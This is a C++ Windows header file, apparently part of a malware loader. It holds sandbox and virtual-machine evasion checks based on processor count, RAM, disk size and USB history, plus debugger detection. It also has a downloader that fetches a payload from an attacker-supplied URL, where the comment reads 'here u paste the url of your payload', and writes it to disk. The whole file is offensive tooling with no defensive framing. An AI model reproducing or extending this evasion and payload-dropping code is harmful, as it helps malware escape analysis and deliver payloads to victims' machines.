#pragma once

#include <iostream>
#include <wlanapi.h>
#include <TlHelp32.h>
#include <wininet.h>

#pragma comment (lib, "Wininet.lib")

#include "connector.h"

//#ifdef _DEBUG
#define DOUT(x) do { std::cout <<x; } while(0)
//#else 
//#define DOUT(x) do { ; } while(0)
//#endif


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////


int is_emulator() {

	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD Processors = systemInfo.dwNumberOfProcessors;
	if (Processors < 3) {
		printf("Processors less than 3, Possibly a Sandbox / VM \n");
		return -1;
	}
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAM = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAM < 2048) {
		printf("RAM less than 2048 MB, Possibly a Sandbox / VM \n");
		return -1;
	}
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD disk = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (disk < 100) {
		printf("disk storage less than 100 GB, Possibly a Sandbox / VM \n");
		return -1;
	}
	HKEY hKey;
	DWORD USB;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
	RegQueryInfoKey(hKey, NULL, NULL, NULL, &USB, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (USB < 2) {
		printf("less than 2 usb where plugged to this system, Possibly a Sandbox / VM \n");
		return -1;
	}
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////


int is_sandbox() {

	if (DetectSandbox() == -1) {
		return -1;
	}

}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////



int being_debugged() {

	if (detect_parent() == -1) {
		return -1;
	}

}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////



int getWebResource() {

	HINTERNET hInternetSession;
	HINTERNET hURL;
	BOOL bResult;
	DWORD dwBytesRead = 1;

	hInternetSession = InternetOpen(
		"fk_u",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0

	);

	hURL = InternetOpenUrl(
		hInternetSession,
		//url u wanna download ur payload from 
		"here u paste the url of your payload",
		NULL,
		0,
		0,
		0
	);

	char buf[1024];

	DWORD dwTemp;		//THE NAME TO SAVE IT 
	HANDLE hFile = CreateFile("result.bin", GENERIC_WRITE, 0, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile) {
		return 0;
	}

	for (; dwBytesRead > 0;)
	{
		InternetReadFile(hURL, buf, (DWORD)sizeof(buf), &dwBytesRead);
		WriteFile(hFile, buf, dwBytesRead, &dwTemp, NULL);
	}
	InternetCloseHandle(hURL);
	InternetCloseHandle(hInternetSession);
	CloseHandle(hFile);
}

